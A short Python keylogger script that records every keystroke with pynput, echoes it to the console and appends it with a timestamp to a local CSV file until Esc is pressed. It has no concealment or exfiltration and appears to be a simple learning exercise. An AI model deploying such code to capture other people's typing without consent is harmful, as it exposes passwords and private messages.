from pynput import keyboard
import datetime

list = []

def on_press(key):
    try:
        x = datetime.datetime.now()
        dt = x.strftime("%Y-%m-%d %H:%M:%S")
        print(key.char)

        f = open("keylog.csv", "a")
        f.write(f"{dt}  |  {key.char}\n")




    except AttributeError:
        x = datetime.datetime.now()
        dt = x.strftime("%Y-%m-%d %H:%M:%S")
        k = str(key)
        if k == "Key.space":
            k = " "
        if k == "Key.shift":
            k = "{shift}"
        if k == "Key.backspace":
            k = ""
        if k == "Key.enter":
            k = "{enter}"
        if k == "Key.tab":
            k = "{tab}"
        if k == "Key.alt_l":
            k = "{left alt}"
        if k == "Key.ctrl_l":
            k = "{left control}"
        if k == "Key.cmd":
            k = "{command}"
        if k == "Key.caps_lock":
            k = "{caps lock}"
        if k == "Key.shift_r":
            k = "{right shift}"
        if k == "Key.delete":
            k = "{delete}"
        if k == "Key.insert":
            k = "{insert}"
        if k == "Key.home":
            k = "{home}"
        if k == "Key.page_up":
            k = "{page up}"
        if k == "Key.page_down":
            k = "{page down}"
        if k == "Key.num_lock":
            k = "{num lock}"
        if k == "Key.left":
            k = "{left}"
        if k == "Key.right":
            k = "{right}"
        if k == "Key.up":
            k = "{up}"
        if k == "Key.down":
            k = "{down}"
        if k == "Key.pause":
            k = "{pause}"
        if k == "Key.scroll_lock":
            k = "{scroll lock}"
        if k == "Key.print_screen":
            k = "{print screen}"
        if k == "Key.alt_gr":
            k = "{alt gr}"
        if k == "Key.menu":
            k = "{menu}"
        if k == "Key.cmd_r":
            k = "{right command}"
        if k == "Key.ctrl_r":
            k = "{right control}"
        print(k)
        f = open("keylog.csv", "a")
        f.write(f"{dt}  |  {k}\n")


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
        ) as listener:
    listener.join()
    print(list)


# ...or, in a non-blocking fashion:
'''
listener = keyboard.Listener(
    on_press=on_press,#
    
    on_release=on_release)
listener.start()
'''
